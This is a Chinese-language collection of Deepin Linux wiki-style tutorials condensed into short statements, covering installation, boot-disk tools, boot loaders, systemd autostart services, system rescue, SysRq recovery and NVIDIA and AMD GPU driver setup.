本教程由深度论坛用户Mzlw（ID：cyx980622）分享，原文地址为https://bbs.deepin.org/forum.php?mod=viewthread&tid=135870。

为Deepin留出硬盘空间的步骤：1. 右键Windows徽标打开磁盘管理；2. 选空闲空间大于30G的分区；3. 右键所选分区选压缩卷；4. 输入空闲空间（计划30G根目录+8G交换分区，1GB=1024MB）。

制作启动U盘步骤：1. 双击运行下载好的Deepin安装镜像中的DEEPIN_B.EXE；2. 点光盘图标选ISO镜像；3. 点U盘图标选要使用的U盘，备份数据后勾选格式化，确认选择后点开始制作。

安装Deepin系统步骤：1. 开机进启动项选择菜单选U盘启动；2. 回车开始安装；3. 选简体中文；4. 设置用户名和密码；5. 点高级选空分区；6. 添加分区建立/根目录（预留交换分区空间，推荐4G）；7. 建立交换分区（选交换分区文件系统）；8. 可挂载旧/home分区（不格式化）；9. 确认后开始安装，固态不到5分钟完成；10. 开机从GRUB菜单进Deepin。

解决无Deepin启动项问题：开机按启动菜单键选Deepin；若无，进Windows下载安装EasyUEFI，打开后点管理EFI启动项，点加号，选Linux or other OS，名填deepin，选EFI分区，浏览选引导文件确认，可调整启动顺序。

标题：ISO_Master
ISO Master是一个光盘镜像文件编辑器，可提取、添加文件到ISO，创建可引导ISO。

安装ISO Master的命令：sudo apt-get install isomaster

卸载ISO Master的命令：sudo apt-get remove isomaster

ISO Master的仓库地址：http://packages.deepin.com/deepin/pool/main/i/isomaster/

标题：启动盘制作_UNetbootin
UNetbootin是跨平台制作启动盘的工具，能将Linux操作系统装进U盘，用于电脑维护和系统还原等。

安装UNetbootin的命令是sudo apt-get install unetbootin。

卸载UNetbootin的命令是sudo apt-get remove unetbootin。

UNetbootin的仓库地址是http://packages.deepin.com/deepin/pool/main/u/unetbootin/。

标题：U盘安装
Deepin Linux U盘安装教程由社区用户(cyx980622)分享，原地址为https://bbs.deepin.org/forum.php?mod=viewthread&tid=41972&extra=。

深度U盘启动制作工具在windows系统中的版本为1.1，360云盘下载地址为http://yunpan.cn/c6WJGnRtItmUd，提取码6325；Linux系统中的版本为1.0，下载地址为http://yunpan.cn/c6WJUJ8cSUSk9，提取码f2d3，感谢youyou2011分享。

安装前需在官网下载Deepin的ISO镜像，完成后比对MD5校验码，确认一致后制作可启动U盘。

打开deepin-boot-maker 1.1.exe（最好右键以管理员权限运行），步骤为：1.选择光盘镜像；2.选择可启动U盘设备；3.格式化U盘（提前转移数据）；4.点U盘设备选择；5.开始制作；6.完成；7.关机或重启。

开机前按F10进入引导选择页面（不同主板可能不同，老主板需改BIOS设置），支持UEFI启动的机子可识别出UEFI的U盘引导项。

安装过程步骤：1.回车选择Install Deepin；2.选简体中文；3.设置用户名、主机名、密码；4.磁盘分区（简单模式直接安装，专家模式需根目录分区，swap分区可设为与物理内存同大）；5.确认安装；6.完成后拔U盘重启；7.修改启动顺序（非必须）。

uefi引导可通过EasyUEFI工具或BIOS修改启动顺序；MBR引导在win7及之后系统可用EasyBCD修改。

标题：WinUSB
WinUSB是创建Windows可引导U盘工具，支持从ISO镜像文件及DVD创建，提供图形界面及命令行界面。

安装WinUSB的命令是sudo apt-get install winusb。

卸载WinUSB的命令是sudo apt-get remove winusb。

WinUSB的仓库地址是http://packages.deepin.com/deepin/pool/main/w/winusb/。

标题：安装指南
深度操作系统官方安装指南可参考https://www.deepin.org/zh/installation/

深度操作系统要求处理器为2.0GHz多核或主频更高的处理器，内存8GB以上，硬盘64GB以上可用空间且推荐固态硬盘，显示器推荐1920*1080或更高分辨率

制作深度操作系统启动盘需要至少8G的U盘或移动硬盘，会丢失U盘上所有内容，需备份

可从官网https://www.deepin.org/zh/download/或镜像仓库https://www.deepin.org/zh/mirrors/releases/下载深度操作系统安装镜像

推荐验证深度操作系统安装镜像的校验码，防止下载损坏或劫持，尤其是HTTP下载源

制作深度操作系统启动盘可用深度启动盘制作工具，也可用Ventoy、rufus、UltraISO等工具

启动盘制作失败时，可先格式化U盘增加成功几率

深度论坛有深度操作系统下载与安装教程、双系统安装及手动分区方法、linux文件系统对比等经验分享

Safe Graphics模式用于显卡不兼容导致无法正常安装的设备，通过禁用部分驱动、用CPU模拟GPU让系统能安装，但体验有问题，正常情况不建议选

标题：光盘烧录工具
Brasero是一款CD/DVD刻录软件，支持单次写入数据DVD和任何类型的CD，能将光盘镜像写入硬盘，图形化界面便于在Linux下烧录光盘。

Brasero的安装命令为sudo apt-get install brasero，卸载命令为sudo apt-get remove brasero。

Brasero的仓库地址是http://packages.deepin.com/deepin/pool/main/b/brasero/。

K3b是全功能CD/DVD烧录软件，可翻录音频光碟为CD数据库支持的格式，能从音频CD提取音轨、从视频DVD提取影辑，用户界面便捷。

K3b的安装命令为sudo apt-get install k3b，卸载命令为sudo apt-get remove k3b。

K3b的仓库地址是http://packages.deepin.com/deepin/pool/main/k/k3b/，相关链接有K3d官方wiki和k3d官网。

Nero是多媒体刻录和编辑应用，用于刻录和复制音乐CD、DVD或蓝光光盘，带有专业工具，可创建、剪切、编辑，有转录和转换功能。

Nero的安装命令为sudo apt-get install nerolinux，卸载命令为sudo apt-get remove nerolinux。

Nero的仓库地址是http://packages.deepin.com/deepin/pool/non-free/n/nerolinux/。

Xfburn是使用GTK开发基于libburnia的CD/DVD/Blu-ray光盘烧录工具。

Xfburn的安装命令为sudo apt-get install xfburn，卸载命令为sudo apt-get remove xfburn。

Xfburn的仓库地址是http://packages.deepin.com/deepin/pool/main/x/xfburn/，相关链接有官方网站和维基百科。

标题：判断BIOS的启动模式和磁盘分区格式
BIOS启动模式分为UEFI引导和Legacy引导：UEFI对应GPT磁盘，启动快，新机型常用；Legacy对应MBR磁盘，旧电脑常用。

BIOS启动模式和硬盘分区格式不一致会导致安装报错，需确保UEFI对应GPT，Legacy对应MBR。

按Win+R，输入msinfo32可查看电脑BIOS的启动模式。

按Win+R输入cmd，再输入diskpart和list disk，GPT下方有星号则是GPT磁盘。

UEFI启动但磁盘是MBR时，输入select disk 1和convert gpt可将编号1的MBR磁盘转GPT。

标题：使用xmake构建LFS系统
使用xmake构建LFS系统的项目目的是让用户从头构建自己的linux发行版，好处是得到统一、和谐的构建系统，用户无需学习不同构建系统的差异，只需使用xmake。

源代码包让用户根据硬件环境优化构建可执行软件，预编译二进制包免编译等待但优化通用，可能有兼容问题。源代码包常用存档格式有tar、zip、gzip等。

从源代码安装软件的通常流程：下载源码包、验证散列值、解压缩、查看帮助文档、配置makefile、构建、安装、清理临时文件。

C语言中，程序分多个源文件，使用对应头文件调用其他源文件内容。编译是将源文件转为二进制对象文件（*.o），链接是将多个对象文件组合成可执行程序或库。

静态库是多个对象文件合并成的中间库（*.a），动态库是用于动态链接的中间库（*.so）。动态链接只记录关联组件信息，不包含内容；静态链接包含相关组件内容。

GCC可调用预处理器、编译器、汇编器等完成编译流程。预处理器处理源代码生成.i等文件，编译器将.i转为汇编代码.s，汇编器将.s转为对象文件.o。

交叉编译是在当前平台编译能在不同目标平台运行的程序，支持此方式的编译器叫交叉编译器。交叉编译涉及build（构建平台）、host（运行平台）、target（输出目标平台）。

构建LFS系统时，环境变量定义：P1=x86_64-pc-linux-gun（本机），P2=x86_64-lfs-linux-gun（中间平台），LFS=~/lfs/rootfs（新系统根目录），P2ROOT=~/lfs/crosstools（中间平台根目录）。

使用xmake构建binutils时，参数包括--trybuild=autotools、--tryconfigs（含--prefix、--with-sysroot等），--target=$P2，--disable-nls，--disable-werror等。

GCC依赖mpfr和mpc，需在GCC目录下创建指向它们源代码的符号链接。GCC需在源文件目录外部构建，即源外构建。

glibc依赖linux header（系统头文件），安装glibc时需进行交叉编译（p1->p2），路径需提供新构造的C1编译器。

构建C2编译器前需准备基本工具包：M4、Ncurses、bash、coreutils、diffutils、file、findutils、gawk、grep、gzip、make、patch、sed、tar、xz。

标题：系统引导器
系统引导器是在操作系统内核运行之前运行的一段小程序，能初始化硬件设备、建立内存空间映射图，为调用操作系统内核做准备。

BIOS引导时会读取引导介质最前面的512字节（主引导记录MBR），MBR包含部分或全部引导加载程序及分区表。

大部分引导加载程序分两阶段引导，第一阶段BIOS引导初始程序加载程序（IPL），IPL查询分区表定位第二阶段引导加载程序；第二阶段是引导加载程序主体，含用户界面和内核引导程序等。

引导加载程序可配置为主引导加载程序（安装在MBR上的第一阶段引导加载程序）或二级引导加载程序（安装在可引导分区的第一阶段引导加载程序，需MBR上的引导加载程序转交控制权）。

较新的Linux引导加载程序提供交互功能，如GUI、加密口令、选择操作系统引导，支持多操作系统在多物理磁盘机器上共存。

Boot Loader严重依赖硬件，不同体系结构系统有不同Boot Loader。Linux引导扇区内容用汇编编写，源代码在arch/i386/boot中（不同体系CPU有各自boot目录），含bootsect.S、setup.S、edd.S、video.S四个文件。

常见的系统引导器有Grub（深度操作系统所采用）和LILO（目前已逐渐被淘汰）。

标题：原生安装
深度操作系统安装过程参考官方社区网站介绍：[如何安装](https://www.deepin.org/installation/)及[深度安装器](https://www.deepin.org/original/deepin-installer/)项目。虚拟机安装客户机类型选Windows7 x64。

深度操作系统官方镜像可访问deepin社区[下载页面](https://www.deepin.org/download/)获取，deepin 15.4版本起不再提供32位官方iso镜像。

Windows系统校验深度操作系统镜像MD5值可使用http://www.keir.net/download/hash.zip等工具，Linux系统可执行`md5sum 镜像文件名`命令，MD5值在下载页面“立即下载”按钮下方。

制作深度操作系统启动盘可使用[深度启动盘制作工具](https://www.deepin.org/original/deepin-boot-maker/)、[通用Windows工具](https://github.com/pbatard/rufus)或[通用全平台工具](https://github.com/balena-io/etcher)。

制作启动盘前需转移U盘中重要数据，建议格式化为FAT32格式，U盘容量不小于2G，制作时不要触碰U盘，部分移动硬盘可能无法识别。

电脑主板为UEFI模式时，需在主板设置中关闭安全启动，重启后在BIOS/UEFI界面按特定键改变启动顺序，台式机一般按Delete键，笔记本一般按F2键等。

深度操作系统安装过程参见[如何安装](https://www.deepin.org/installation/)，安装完成后按提示重启即可进入系统，安装失败可扫描二维码反馈日志。

多硬盘用Legacy BIOS引导时，安装deepin后可能无法引导，可修改硬盘启动优先级或重新安装时修改grub安装位置到第一个硬盘。

新买预装Windows 10的品牌机多为UEFI模式启动，硬盘是GPT格式，安装deepin前需关闭Secure Boot。

支持UEFI的旧电脑，硬盘为MBR格式，用UEFI启动U盘安装deepin可能失败，可选择非UEFI方式启动U盘或设置主板仅Legacy boot。

新组装机器用旧硬盘（MBR格式），新主板默认UEFI ONLY启动时，需进入主板设置开启Legacy boot或CSM Support。

成功安装后在登录界面输入密码无法进入桌面，多为图形驱动问题，可按Ctrl+Alt+F2切换到字符界面，登录后执行删除nouveau驱动模块等指令。

启动菜单分辨率不正确的解决方法参见<https://bbs.deepin.org/forum.php?mod=redirect&goto=findpost&ptid=133875&pid=361813&fromuid=4870>。

标题：如何自己写一个开机自启动服务？
systemd 是 Linux 下与 SysV 和 LSB 初始化脚本兼容的系统和服务管理器，支持socket和D-Bus开启服务等功能。

service文件一般分为[Unit]、[Service]、[Install]三个部分。

[Unit]部分用来定义Unit的元数据及与其他Unit的关系，包含Description等字段。

Description是[Unit]部分的字段，用于简短描述。

[Service]部分定义Service的配置，Type是其字段，有simple等多种值。

Type=simple是[Service]的默认值，执行ExecStart指定的命令启动主进程。

ExecStart是[Service]的字段，用于指定启动当前服务的命令。

[Install]部分定义如何启动及是否开机启动，WantedBy是其字段。

WantedBy的值是一个或多个Target，当前Unit激活时符号链接会放入对应子目录。

支持Systemd的软件安装时，会在/usr/lib/systemd/system目录添加配置文件。

创建服务文件可进入/etc/systemd/system目录，用sudo touch命令创建，如apptest.service。

启动服务使用systemctl start 服务名.service命令，如systemctl start apptest.service。

查看服务状态用systemctl status 服务名.service命令，如systemctl status apptest.service。

设置开机自启动使用systemctl enable 服务名.service命令，如systemctl enable apptest.service。

服务文件中[Service]的User字段用于指定以什么用户执行命令。

Type=forking表示以fork方式从父进程创建子进程，父进程创建后立即退出。

Restart字段定义何种情况Systemd会自动重启当前服务，值包括always等。

After字段指定若该字段的Unit也要启动，必须在当前Unit之前启动。

ExecStop是[Service]的字段，用于指定停止当前服务的命令。

RequiredBy的值是一个或多个Target，当前Unit激活时符号链接放入对应子目录。

标题：启动器美化工具_Gnome_Pie
Gnome Pie是一款炫酷的程序启动器，可快速启动程序及执行系统功能，有超炫外观和快捷键功能。

安装Gnome Pie的命令是sudo apt-get install gnome-pie。

卸载Gnome Pie的命令是sudo apt-get remove gnome-pie。

Gnome Pie的仓库地址是http://packages.deepin.com/deepin/pool/main/g/gnome-pie/。

标题：启动音效
开关机音乐是电脑开启瞬间的音乐，不同音乐带来不同感觉。

在深度操作系统中可加入优美的开机启动音乐。

实现桌面环境启动可在~/.config/autostart（特定用户）或/etc/xdg/autostart（全局用户）目录下创建.desktop文件。

首先要安装软件包gnome-session-canberra，可通过sudo apt install gnome-session-canberra命令。

在～/.config/autostart（推荐）或/etc/xdg/autostart目录下新建与编辑名为loginsound.desktop的文件，可用gedit $HOME/.config/autostart/loginsound.desktop命令。

loginsound.desktop文件内容为[Desktop Entry]、Name=GNOME Login Sound、Type=Application、Exec=/usr/bin/canberra-gtk-play --file="XXX" --description="GNOME Login sound"、Comment=Startup Sound，XXX需换为音频文件路径。

标题：开机动画
开机动画(Bootsplash)是操作系统的启动过程的图形化表示。

开机动画可以将系统启动的信息以图形界面显示出来，并且也可以切换文本模式，以查看系统启动信息输出。

开机动画可以提高系统美观程度，吸引用户，并且开机动画可以在开机阶段和用户交互，解决一部分开机遇到的系统问题。

Plymouth是深度操作系统所使用的开机动画程序。

Bootsplash是第一款开机动画程序，目前已经被Splashy取代。

fbsplash是Gentoo开发的新开机动画程序，为了取代bootsplash。

Splashy是新的开机动画程序，以取代老化的bootsplash开机动画程序。

usplash是ubuntu之前早期使用的开机动画程序。

XSplash是Ubuntu9.10开始使用的开机动画程序。

标题：登录管理器
显示管理器也叫登录管理器，提供登录界面，提示输入用户名和密码，成功后启动会话（窗口管理器或桌面环境）。一个图形服务器只能由一个登录管理器管理，系统可安装多个。

常见登录管理器有LightDM（深度默认）、GDM（Gnome默认）、KDM（KDE默认）。

切换登录管理器方法一：安装时按Tab选择并回车。方法二：终端执行sudo dpkg-reconfigure 显示管理器名称，再选择默认。

登录管理器出错（Checking Battery State ...无法登录）：ctrl+alt+F1进tty1，输用户名密码登录，终端执行sudo apt-get install gdm和sudo dpkg-reconfigure gdm，TAB选LightDM回车，Alt+F1切回图形界面。

标题：系统登录异常修复
系统救援的核心功能是在系统修改错配置文件、更新系统或软件失败导致启动失败时，提供自救机会，前提是了解异常原因。

系统能正常引导时，可执行系统救援步骤：在grub引导时按e进入编辑模式。

系统救援第二步：找到root=uuid那里随便删除或添加一个字符。

系统救援第三步：按F10引导错误进入initramfs。

系统救援第四步：执行blkid查询分区。

系统救援第五步：挂载根分区到/root。

系统救援第六步：修复异常配置文件。

挂载根分区到/root的命令：mount -t ext4 /dev/nvme0n1p5 /root。

进入chroot环境的命令：chroot /root。

chroot /root后，可在命令行操作，如恢复配置、安装或卸载软件等。

编辑/etc/fstab文件的命令：vi /etc/fstab。

标题：编写自启动程序
Linux下可通过图形管理设置自启动程序：打开启动器，右键选中需要开机启动的程序——添加至开机启动项。

Linux加载后运行init进程，init根据配置文件启动其它进程，修改/etc/rc、/etc/rc.d、/etc/rc?.d目录下的脚本文件可实现程序自启动。

编辑/etc/rc.local文件（系统最后启动的脚本），在文件最末加“xinit”或“startx”，可在开机后直接进入X-Window。

使用systemd的系统默认不含rc.local文件，需在/etc目录创建rc.local纯文本文件，写入命令后赋予可执行权限：sudo chmod +x /etc/rc.local。

在~/.config/autostart目录添加.desktop文件可设置自启动，如XX-Net.desktop，其中Exec指定启动命令。

用户登录时，bash先执行全局登录脚本/etc/profile，再按顺序查找~/.bash_profile、~/.bash_login、~/.profile，只执行最先找到的一个。

标题：系统死机
系统死机按类型可分为真死机和假死机。真死机是电脑运行遇致命错误，无法继续正常运行；假死机是程序占用几乎几乎全部硬件资源，导致程序无响应。

真死机和假死机的区别：死机不可在软件层面解决，需重启或换硬件；假死机是硬件资源暂时耗尽，等待程序处理完可恢复。联系：初期无严格差别，假死机时继续输指令可能变死机，等待后采取硬件措施会让判断变难。

正常遇到的多为假死机，常见情况是鼠标能移动（可能无法移动）但不能点击，可通过Ctrl+Alt+（F1～F6）切换至控制台(tty)。

可能导致死机的情况：直接盒盖，可能停留在登录界面无法操作，可取消设置中心->电源管理->盒盖时睡眠选项；注销登录后长时间不操作，可能停留在登录界面无法操作，应避免此情况。

常规处理：先判断是否假死机，方法是按Ctrl+Alt+F[0-9]，能切换到TTY终端则为假死机。假死时切换tty或ssh，按安全方法处理。真死时重启后提供日志，执行sudo deepin-feedback-cli和journalctl -b -1，将日志反馈到http://feedback.deepin.org/。休眠情况类似，需提供休眠前后日志。

不安全处理包括重启系统和重启登陆管理器。重启系统：在Ctrl+Alt+（F1～F6)控制台中执行sudo reboot。重启登陆管理器：在上述控制台中执行sudo systemctl restart lightdm。

安全处理使用SysRq键组合，由Linux内核解释，可在系统状态不佳时下达底层命令，常用来恢复X-server假死或安全重启。SysRq和PrintScreen一般在同一键位，多数发行版禁止某些功能，开启方法参考相关链接。

安全重启：遇假死且其他方法无效时，按住Alt + SysRq，依次按R、S、E、I、U、B，各键稍按一会儿。若无效，同时按Ctrl+Alt再操作。可通过口诀记住组合键。

安全关机：键序列与安全重启除最后一个键外相同，按住Alt + SysRq，依次按R、S、E、I、U、O，各键稍按一会儿。

安全操作按键含义：R（从X取回键盘控制），E（结束Nice值-15的程序），I（结束Nice值-9的未终止程序），S（将数据刷新到磁盘），U（全部重新挂载为只读），B（重新启动），O（关闭系统）。

标题：编写定期自动运行程序
Linux的crond守护程序能周期性检查/var/spool/cron目录下命令文件，按设定时间执行命令，用户可通过crontab命令管理这些文件。

建立crondFile文件，内容为“00 9 23 Jan *HappyBirthday”，运行`crontab cronFile`后，元月23日上午9:00会自动执行“HappyBirthday”程序。

at命令与crond类似，但只执行一次，一般格式为at [ -f file ] time，可执行file文件命令或直接输入命令。

输入$ at 12:00，再输入mailto Roger －s ″Have a lunch″ < plan.txt，按Ctrl+D，会在2000－11－09 12:00给Roger发指定邮件。

标题：Linux下创建systemd启动项实现开机自启动
创建systemd启动项需root权限，用sudo -i操作。

需创建文件/etc/systemd/system/myservice.service。

[Unit]部分包含Description、After=network.target、StartLimitIntervalSec=0。

[Service]部分有Type=simple、Restart=always、RestartSec=1、User=root、ExecStart=/path-to/myservice.sh。

[Install]部分为WantedBy=multi-user.target。

若程序运行完成后会退出，无需自动重启，将Restart=always改成Restart=no。

若需联网前启动服务，可删掉After=network.target。

标题：Deepin安装Nvidia460显卡驱动
用Nvidia官网的.run安装程序安装过驱动的卸载方法：找到.run安装包，打开终端，运行cd ~/Downloads和sudo bash NVIDIA-Linux-x86_64-460.27.04.run --uninstall，所有选项选Yes和OK。

卸载通过软件包管理器安装的旧版nvidia驱动：终端执行sudo apt purge --autoremove '*nvidia*'，所有选项回复y，弹窗选Yes和OK。

添加Debian的buster-backports软件源：终端执行echo 'deb http://mirrors.aliyun.com/debian buster-backports main contrib non-free' | sudo tee /etc/apt/sources.list.d/debian-buster-backports.list。

启用32位架构并更新软件包列表：终端执行sudo dpkg --add-architecture i386和sudo apt update。

处理“由于没有公钥，无法验证下列签名：NO_PUBKEY”错误：执行sudo apt-get update 2>&1 | tee /tmp/apt.tmp; cat /tmp/apt.tmp | grep 'NO_PUBKEY' | awk -F'NO_PUBKEY' '{print $2}' | sort | uniq | xargs sudo apt-key adv --keyserver keyserver.ubuntu.com --recv，反复运行至错误消失。

安装aptitude：终端执行sudo apt install aptitude。

用aptitude安装460驱动：终端执行sudo aptitude install 'nvidia-driver/buster-backports'，先回复n拒绝未安装方案，再回复y接受正确方案，确保删除软件包数量为0后回复y。

安装460驱动的64位附加组件：终端执行sudo aptitude install 'nvidia-vulkan-icd/buster-backports' 'nvidia-smi/buster-backports' 'nvidia-settings/buster-backports'，先回复n再回复y。

安装驱动的32位附加组件：终端执行sudo aptitude install 'libnvidia-glcore:i386/buster-backports' 'libnvidia-eglcore:i386/buster-backports' 'nvidia-driver-libs:i386/buster-backports' 'libnvidia-glvkspirv:i386/buster-backports' 'libnvidia-ml1:i386/buster-backports'，先回复n再回复y。

安装Vulkan支持库：终端执行sudo aptitude install libvulkan1 libvulkan1:i386 vulkan-tools 'vulkan-utils|vulkan-tools'。

将新装的显卡驱动用于所有内核版本：执行sudo update-initramfs -k all -u。

笔记本安装双显卡支持包：wget https://file.winegame.net/packages/deepin/mgpu/mgpu-prime_0.2.0_amd64.deb，sudo apt install -y ./mgpu-prime_0.2.0_amd64.deb，打开Wine游戏助手的“Nvidia Prime渲染卸载”选项。双显卡支持包仅适用于LightDM显示管理器。

验证Nvidia驱动安装成功：重启后打开“NVIDIA X 服务器设置”，查看版本为460.32。

安装CUDA功能：运行aptitude install libcuda1/buster-backports nvidia-cuda-dev/buster-backports nvidia-cuda-toolkit/buster-backports，先回n再回y，版本为CUDA 11。

该教程适用于基于Debian 10的发行版，如Deepin v20、UOS 20，不适用于Ubuntu 20.04。

标题：deepin安装N卡驱动教程
deepin 20.6仓库内的N卡驱动已更新到510版本，多数用户无需用run文件安装，通过apt安装更简单，无需手动禁用nouveau、更改配置文件和使用显卡驱动管理器。

安装N卡驱动第一步是卸载原有驱动，指令为sudo apt autoremove nvidia-*。

安装N卡驱动第二步是添加32位架构并刷新源，指令为sudo dpkg --add-architecture i386和sudo apt update。

安装N卡驱动第三步是安装nvidia-detect，指令为sudo apt install nvidia-detect。

安装N卡驱动第四步是执行nvidia-detect，指令为nvidia-detect。

安装N卡驱动第五步，若nvidia-detect显示绿色部分为nvidia-driver，指令为sudo apt install nvidia-driver nvidia-settings nvidia-smi；若是其它内容如nvidia-legacy-390xx-driver，指令为sudo apt install nvidia-legacy-390xx-driver，安装中有提示直接回车，安装完需重启。

检查N卡驱动是否安装成功，重启后终端输入nvidia-smi，如图中两处有内容即装好；较老的390系列驱动可能无nvidia-smi，可打开浏览器输入chrome://gpu，Driver vendor为nvidia即装好。

intel和nvidia双显卡切换，可去星火应用商店下载显卡插件，安装后注销重新登录，在状态栏右下角找到切换图标，切换时卡住或没反应可重启。

打开N卡同步功能的第一种方法：适用于intel和nvidia双显卡，安装好显卡切换插件，切换成intel，终端输入sudo rm /etc/X11/xorg.conf，再切换成nvidia。

打开N卡同步功能的第二种方法：编辑/etc/default/grub，若没有GRUB_CMDLINE_LINUX=，在末尾加GRUB_CMDLINE_LINUX="nvidia-drm.modeset=1"，否则直接在后面加内容，然后sudo update-grub，重启电脑；未解决可添加两步：1. 找到nvidia设置里显示器界面NAME:后的字符；2. sudo xrandr --output 复制的字符 --set "PRIME Synchronization" 1。

nvidia-detect给部分老显卡推荐nvidia-driver但安装不可用，解决办法：1. 卸载以前的驱动，指令sudo apt autoremove nvidia-*；2. 安装390驱动再重启，指令sudo apt install nvidia-legacy-390xx-driver。

装了显卡切换插件出现开机黑屏无法进入桌面，解决方法：1. 按Ctrl + Alt ( + Fn ) + F2进入超级终端登录，卸载插件sudo apt purge dde-dock-graphics-plugin，删除配置文件sudo rm /etc/X11/xorg.conf，重启；仍黑屏则重新进入超级终端，卸载驱动sudo apt autoremove nvidia-*，删除配置文件，再重启。

标题：从Radeon驱动更换到AMD驱动
从Radeon驱动更换到AMD驱动的方法已在显卡“Radeon HD 8570 /R7 240/340 /R520 OEM”上验证可用。

安装相关驱动可执行命令：sudo apt install mesa-vulkan-drivers mesa-vulkan-drivers:i386，若依赖有问题，可不安装。

添加黑名单屏蔽radeon驱动的步骤：touch /etc/modprobe.d/blacklist-radeon.conf；echo blacklist radeon >> /etc/modprobe.d/blacklist-radeon.conf。

修改grub需编辑/etc/default/grub文件，将GRUB_CMDLINE_LINUX_DEFAULT设置为"amdgpu.si_support=1 amdgpu.cik_support=1 amdgpu.dc=1 amdgpu.dpm=1 amdgpu.modeset=1"。

更新grub的命令为：sudo update-grub2 && sudo update-initramfs -u -k all。

更新initramfs可能提示缺少固件，需手动下载，下载地址：http://anduin.linuxfromscratch.org/sources/linux-firmware/amdgpu/。

完成相关操作后需重启，命令为reboot。

查看驱动是否更换成功，可执行sudo lspci -v | grep amdgpu -B 19，应有"Kernel driver in use: amdgpu"；或执行sudo lshw -c video | grep amdgpu -B 10 -A 1，应有"configuration: driver=amdgpu"。

标题：升级到Nvidia最新闭源驱动450.66教程
按照这个教程安装的版本目前是450.66，以后可能会是更新的版本。文中出现的版本号450.66仅供参考。

操作不慎可能会导致系统完全无法启动！即使完全按照教程进行操作，也不一定会成功！如果失败，你将无法进入图形界面，只能进入Linux控制台。最坏情况下，系统会完全没有图像显示，需启动到另一个系统修复或重装。没有Linux命令行经验者，需备份数据并做好重装准备。

UOS 20自带的Nvidia闭源驱动是450.51，可通过添加Debian sid不稳定版软件源升级到450.66。buster-backports源比sid源更可靠，因UOS和deepin v20基于debian 10，陷入依赖地狱风险更小。

升级第一步：打开开发者模式（控制中心 > 通用 > 开发者模式）。然后在终端粘贴命令安装旧版Nvidia组件：sudo apt install -y nvidia-driver nvidia-smi ... 若找不到deepin-nvidia-prime，需先下载mgpu-prime_0.2.0_amd64.deb再安装。

完成教程第4步前，不要运行apt upgrade或其他升级命令，系统自动更新提示也不要安装。不建议升级nvidia-settings，因其依赖多，可能陷入依赖包地狱，不升级不影响使用。

添加Nvidia 450.66驱动软件源的命令：echo 'deb http://mirrors.aliyun.com/debian sid main contrib non-free' | sudo tee /etc/apt/sources.list.d/debian-sid.list。更新列表：sudo apt update。安装新版驱动：sudo apt install nvidia-driver libnvcuvid1 ... 若升级几百个软件包，需拒绝并执行清理。

升级后清理工作：删除软件源sudo rm /etc/apt/sources.list.d/debian-sid.list，清理缓存sudo apt clean，清理多余包sudo apt autoclean。

重启后若顺利进入图形界面，打开“NVIDIA X 服务器设置”，若显示“NVIDIA Driver Version: 450.66”则升级成功。

笔记本需打开“Nvidia Prime渲染卸载”选项，否则部分游戏打不开，提示无可用显卡驱动。

安装失败且显示器有显示时，按Ctrl + Alt + F2进入文本命令行，输入用户名和密码，运行export LANGUAGE=en切换英文，再执行命令卸载新版并安装旧版驱动。

标题：编写退出后自动执行的脚本
退出登录时，bash自动执行个人的退出登录脚本/.bash_logout。

在/.bash_logout中加入命令可实现退出登录时自动执行该命令，例如加入“tar －cvzf c.source.tgz ＊.c”可备份＊.c文件。

标题：从Radeon驱动更换到AMD驱动-2
从Radeon驱动更换到AMD驱动的方法已在显卡“Radeon HD 8570 /R7 240/340 /R520 OEM”上验证可用。

安装相关驱动可执行命令：sudo apt install mesa-vulkan-drivers mesa-vulkan-drivers:i386，若依赖有问题，可不安装。

添加黑名单屏蔽radeon驱动的步骤：touch /etc/modprobe.d/blacklist-radeon.conf；echo blacklist radeon >> /etc/modprobe.d/blacklist-radeon.conf。

修改grub需编辑/etc/default/grub文件，将GRUB_CMDLINE_LINUX_DEFAULT设置为"amdgpu.si_support=1 amdgpu.cik_support=1 amdgpu.dc=1 amdgpu.dpm=1 amdgpu.modeset=1"。

更新grub的命令为：sudo update-grub2 && sudo update-initramfs -u -k all。

更新initramfs可能提示缺少固件，需手动下载，下载地址：http://anduin.linuxfromscratch.org/sources/linux-firmware/amdgpu/。

完成相关操作后需重启，命令为reboot。

查看驱动是否更换成功，可执行sudo lspci -v | grep amdgpu -B 19，应有"Kernel driver in use: amdgpu"；或执行sudo lshw -c video | grep amdgpu -B 10 -A 1，应有"configuration: driver=amdgpu"。

标题：Deepin v20 安装显卡驱动教程
本教程不适用于ARM64和龙芯机器，仅限x86 CPU（英特尔、AMD、兆芯、海光）。

打开Wine游戏助手，点右上角三个点，选“首选项”，“硬件信息”，看是否有“Vulkan: Supported”，有则驱动装好。

UOS需在“控制中心”>“通用”打开开发者模式，激活方式有在线和离线，离线可从chinauos.com/developMode获取文件。

A卡、AMD核显、英特尔核显可通过命令安装mesa驱动：sudo apt update；sudo apt upgrade；sudo apt install libgl1-mesa-dri libgl1-mesa-dri:i386 mesa-vulkan-drivers mesa-vulkan-drivers:i386 libvulkan1 libvulkan1:i386 'vulkan-utils|vulkan-tools'。

NAVI架构显卡（如5700XT）需更新Linux amdgpu固件映像：安装git和make；克隆清华源linux-firmware.git；进入目录安装；更新启动文件。

N卡等安装驱动前先执行：sudo dpkg --add-architecture i386；sudo apt update。

从UOS/Deepin官方源安装N卡驱动命令：sudo apt install libgl1-mesa-dri libgl1-mesa-dri:i386 mesa-vulkan-drivers mesa-vulkan-drivers:i386 nvidia-driver nvidia-smi...；并更新启动文件。

双显卡笔记本可选安装mgpu-prime：wget https://file.winegame.net/packages/deepin/mgpu/mgpu-prime_0.2.0_amd64.deb；sudo apt install ./mgpu-prime_0.2.0_amd64.deb。

笔记本可能需打开“Nvidia Prime渲染卸载”，在“Vulkan ICD 加载器”选“NVIDIA ICD”。

通过.run文件安装驱动后缺Vulkan库，可执行：sudo apt update；sudo apt upgrade；sudo apt install libvulkan1 libvulkan1:i386 'vulkan-utils|vulkan-tools'。

安装N卡驱动后不能调整亮度，可参考相关教程。

mgpu-prime仅支持lightdm显示管理器，不支持gdm。

mgpu-prime不支持Wayland会话，需用X11，判断命令：echo $XDG_SESSION_TYPE。

方法3是从中风险的Debian反向移植软件源安装最新N卡驱动，详见相关帖子。

方法4是通过英伟达官网.run文件安装N卡驱动，不推荐，因复杂且易导致无法进入桌面。

标题：amd显卡使用情况查看
查看AMD显卡使用情况可使用工具radeontop。

安装radeontop的命令是sudo apt install radeontop。

运行radeontop的命令是sudo radeontop。

radeontop界面最后一行VRAM显示显存大小和使用情况，如1982M为显存大小，833M为使用大小，使用率42.01%。

标题：NVIDIA独立显卡的安装方法
